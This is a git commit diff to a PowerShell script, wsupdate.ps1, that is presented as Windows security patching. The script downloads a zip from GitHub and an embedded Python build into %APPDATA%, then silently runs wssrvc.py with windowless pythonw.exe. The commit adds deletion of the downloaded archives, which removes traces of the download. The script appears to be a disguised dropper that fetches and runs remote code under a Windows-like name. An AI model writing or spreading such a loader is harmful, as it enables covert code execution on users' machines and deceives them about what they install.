6eed9691c8d7ebcf8d74fff5932b094f8990e3ff
xxoo-d <im4x5yn74x@kaiju-security.com>
2026-02-23 17:11:05 -0500

    Update wsupdate.ps1

--- wsupdate.ps1
+++ wsupdate.ps1
@@ -6,4 +6,6 @@ wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/Win
 Expand-Archive -Path $env:APPDATA\WindowsSecurity.zip -DestinationPath $env:APPDATA\$FolderName
 wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
 Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\WindowsSecurity\
+rm $env:APPDATA\WindowsSecurity.zip
+rm $env:APPDATA\python-3.14.0-embed-amd64.zip
 & "$env:APPDATA\\$FolderName\\WindowsSecurity\\pythonw.exe" @("$env:APPDATA\$FolderName\WindowsSecurity\wssrvc.py")
